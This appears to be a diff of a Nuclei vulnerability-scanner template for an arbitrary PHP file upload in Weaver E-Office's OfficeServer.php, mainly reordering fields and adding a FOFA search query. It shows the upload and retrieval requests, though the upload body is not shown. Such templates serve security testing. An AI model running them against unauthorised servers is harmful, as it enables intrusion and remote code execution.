@@ -1,5 +1,4 @@
 id: weaver-office-server-file-upload
-
 info:
   name: OA E-Office OfficeServer.php Arbitrary File Upload
   author: SleepingBag945
@@ -12,17 +11,26 @@ info:
     cpe: cpe:2.3:a:weaver:e-office:*:*:*:*:*:*:*:*
   metadata:
     runzero-review: REJECT/2025-11-07/excluding tag intrusive
-    verified: true
+    fofa-query: app="泛微-EOffice"
     max-request: 2
+    product: e-office
     vendor: weaver
-  tags: weaver,e-office,oa,rce,intrusive,fileupload,vuln
-
+    verified: true
+  tags: e-office,fileupload,intrusive,oa,rce,vuln,weaver
 variables:
-  filename: "{{to_lower(rand_base(5))}}"
-  string: "weaver-office-server-file-upload"
-
+  filename: '{{to_lower(rand_base(5))}}'
+  string: weaver-office-server-file-upload
 http:
-  - raw:
+  - matchers:
+      - part: body_2
+        type: word
+        words:
+          - '{{md5(string)}}'
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
+    raw:
       - |
         POST /eoffice10/server/public/iWebOffice2015/OfficeServer.php HTTP/1.1
         Host: {{Hostname}}
@@ -45,15 +53,3 @@ http:
       - |
         GET /eoffice10/server/public/iWebOffice2015/Document/{{filename}}.php HTTP/1.1
         Host: {{Hostname}}
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body_2
-        words:
-          - '{{md5(string)}}'
-
-      - type: status
-        status:
-          - 200
-
